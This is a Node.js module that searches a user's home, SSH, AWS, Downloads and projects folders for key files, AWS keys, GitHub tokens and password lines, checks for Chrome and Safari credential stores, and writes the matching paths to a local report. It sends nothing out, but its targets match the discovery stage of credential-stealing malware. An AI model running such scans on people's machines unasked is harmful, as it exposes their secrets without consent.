const fs = require('fs');
const path = require('path');
const os = require('os');

const OUTPUT_FILE = path.join(process.cwd(), "analysis_report.txt");

const patterns = [
  /AKIA[0-9A-Z]{16}/,
  /ghp_[A-Za-z0-9]{36}/,
  /password\s*=\s*.*/i,
  /secret\s*=\s*.*/i
];

const sensitiveExtensions = [".pem", ".key", ".p12", ".crt", ".cer"];

const home = os.homedir();

const targetDirs = [
  home,
  path.join(home, ".ssh"),
  path.join(home, ".aws"),
  path.join(home, "Downloads"),
  path.join(home, "projects")
];

let findings = [];

/* =========================
   File Scan
========================= */

function scanDirectory(dir) {
  let files;

  try {
    files = fs.readdirSync(dir);
  } catch {
    return;
  }

  files.forEach(file => {
    const fullPath = path.join(dir, file);

    try {
      const stat = fs.statSync(fullPath);

      if (stat.isDirectory()) {
        scanDirectory(fullPath);
      } else {
        if (sensitiveExtensions.some(ext => file.toLowerCase().endsWith(ext))) {
          findings.push(`[KEY] ${fullPath}`);
        }

        const content = fs.readFileSync(fullPath, 'utf8');

        patterns.forEach(p => {
          if (p.test(content)) {
            findings.push(`[SECRET] ${fullPath}`);
          }
        });
      }
    } catch {}
  });
}

/* =========================
   Browser Checks
========================= */

function checkChrome() {
  const chromePath = path.join(
    home,
    "Library/Application Support/Google/Chrome/Default/Login Data"
  );

  if (fs.existsSync(chromePath)) {
    findings.push(`[BROWSER] Chrome data present`);
  }
}

function checkSafari() {
  const safariPath = path.join(home, "Library/Safari");

  if (fs.existsSync(safariPath)) {
    findings.push(`[BROWSER] Safari data present`);
  }
}

/* =========================
   Main
========================= */

function runAnalysis() {
  targetDirs.forEach(dir => scanDirectory(dir));

  checkChrome();
  checkSafari();

  try {
    fs.writeFileSync(OUTPUT_FILE, findings.join("\n"));
  } catch {}
}

module.exports = { runAnalysis };
